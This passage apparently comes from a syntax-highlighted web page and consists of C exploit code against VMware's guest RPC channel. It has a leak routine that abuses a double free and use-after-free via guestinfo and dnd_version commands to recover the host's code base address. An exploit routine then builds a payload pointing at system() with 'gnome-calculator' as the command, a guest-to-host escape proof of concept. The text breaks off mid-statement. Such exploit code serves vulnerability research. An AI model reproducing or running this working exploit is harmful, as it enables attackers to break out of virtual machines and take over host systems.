AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffer....,bp:0x5555556DD3EF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFD0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token 